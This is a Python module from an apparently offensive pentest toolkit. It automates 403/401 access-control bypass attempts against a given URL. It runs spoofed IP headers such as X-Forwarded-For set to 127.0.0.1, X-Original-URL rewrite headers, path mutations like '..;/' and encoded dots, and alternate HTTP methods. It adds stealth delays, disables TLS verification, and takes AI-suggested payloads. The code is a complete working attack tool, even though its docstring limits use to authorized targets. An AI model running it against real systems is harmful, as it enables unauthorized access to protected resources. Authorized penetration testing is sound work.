"""403/401 bypass — try well-known access-control bypass techniques against a
forbidden URL and report which ones return a success/redirect instead.

Techniques: header spoofing (X-Forwarded-For, X-Original-URL, ...), path mutations
(trailing chars, encodings, `..;/`, case), and HTTP method changes. All requests are
active — run only against authorized targets. TLS verification is disabled because
pentest targets often use self-signed certificates.
"""
import concurrent.futures
from urllib.parse import urlparse

import requests
import urllib3

from silentpivot.opsec import profile as opsec

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers that back-ends / proxies sometimes trust for access decisions.
_IP_HEADERS = [
    "X-Forwarded-For", "X-Forwarded-Host", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Real-IP", "X-Host", "X-Custom-IP-Authorization",
    "X-Forwarded-Server", "X-Forwarded-Scheme",
]
# Path suffixes/prefixes and mutations that can slip past path-based rules.
_PATH_SUFFIXES = ["/", "/.", "//", "/./", "/..;/", "/;/", "%20", "%09", "?", "#",
                  ".json", "/~", "/*", "%2e", "..%2f"]
_PATH_PREFIXES = ["//", "/./", "/%2e/"]
_METHODS = ["POST", "PUT", "HEAD", "OPTIONS", "PATCH", "TRACE"]


class Bypass403:
    def __init__(self, timeout=8, max_workers=20):
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = requests.Session()
        opsec.apply_to_session(self.session)
        # Body size of the site root, learned in run(); used to reject "bypasses" that
        # merely return the homepage.
        self._root_len = None

    def _req(self, method, url, headers=None):
        try:
            resp = self.session.request(
                method, url, headers=headers, timeout=self.timeout,
                verify=False, allow_redirects=False,
            )
            return resp.status_code, len(resp.content)
        except requests.RequestException:
            return None

    def _build_attempts(self, url, extra_payloads=None):
        """Yield (technique, method, url, headers) tuples to try."""
        p = urlparse(url)
        base = f"{p.scheme}://{p.netloc}"
        path = p.path or "/"
        attempts = []

        # AI-suggested path variants (each tested and verified like the built-ins)
        for extra in (extra_payloads or []):
            test = base + extra if extra.startswith("/") else base + path + extra
            attempts.append((f"ai: {extra}", "GET", test, None))

        # 1) Header spoofing (value 127.0.0.1 = pretend to be localhost/internal)
        for h in _IP_HEADERS:
            attempts.append((f"header {h}: 127.0.0.1", "GET", url, {h: "127.0.0.1"}))
        # URL-rewrite headers: request the site root but point the header at the path
        for h in ("X-Original-URL", "X-Rewrite-URL"):
            attempts.append((f"header {h}: {path}", "GET", base + "/", {h: path}))
        attempts.append(("header Referer: <url>", "GET", url, {"Referer": url}))

        # 2) Path mutations
        for s in _PATH_SUFFIXES:
            attempts.append((f"path {path}{s}", "GET", base + path + s, None))
        for pre in _PATH_PREFIXES:
            attempts.append((f"path {pre}{path.lstrip('/')}", "GET",
                             base + pre + path.lstrip("/"), None))
        if path.lower() != path.upper():
            attempts.append(("path UPPERCASE", "GET", base + path.upper(), None))

        # 3) HTTP method changes
        for m in _METHODS:
            attempts.append((f"method {m}", m, url, None))

        return attempts

    def _try(self, attempt):
        opsec.wait()   # stealth: random delay between requests
        technique, method, url, headers = attempt
        r = self._req(method, url, headers)
        if r is None:
            return None
        status, length = r
        if status >= 400:
            return None

        # A 200 alone is not a bypass. Path tricks like '/../' normalize back to the
        # site root, and rewrite headers are simply ignored by most servers — both
        # return the homepage. If the body matches the site root we got the same page
        # any visitor gets, not the protected resource.
        if self._root_len is not None and abs(length - self._root_len) < 32:
            return None
        # TRACE echoes the request back; it never returns the protected resource, so
        # it's reported as its own weakness rather than as a bypass.
        if method == "TRACE":
            return {"technique": "TRACE enabled (request echo, not resource access)",
                    "method": method, "url": url, "status": status, "length": length,
                    "bypass": False}
        return {"technique": technique, "method": method, "url": url,
                "status": status, "length": length, "bypass": True}

    def baseline_status(self, url):
        """Status code of a plain GET — lets the caller check whether bypassing is even
        relevant (401/403) before spending time on payload generation."""
        r = self._req("GET", url)
        return r[0] if r else None

    def run(self, url, extra_payloads=None, baseline=None):
        """Returns {url, baseline, applicable, hits}. `hits` = techniques that got
        a < 400 response. `applicable` is False if the URL isn't 401/403 to begin with.
        `extra_payloads` (e.g. AI-suggested path variants) are tested like the built-ins.
        `baseline` can be passed in to reuse an already-known status code."""
        if baseline is None:
            baseline = self.baseline_status(url)
        if baseline not in (401, 403):
            return {"url": url, "baseline": baseline, "applicable": False, "hits": []}

        # Learn what the site root looks like: any "bypass" that just returns the
        # homepage is path normalization, not access to the protected resource.
        p = urlparse(url)
        root = self._req("GET", f"{p.scheme}://{p.netloc}/")
        self._root_len = root[1] if root and root[0] < 400 else None

        hits = []
        attempts = self._build_attempts(url, extra_payloads)
        with concurrent.futures.ThreadPoolExecutor(max_workers=opsec.workers(self.max_workers)) as ex:
            for res in ex.map(self._try, attempts):
                if res:
                    hits.append(res)
        hits.sort(key=lambda h: h["status"])
        return {"url": url, "baseline": baseline, "applicable": True, "hits": hits}
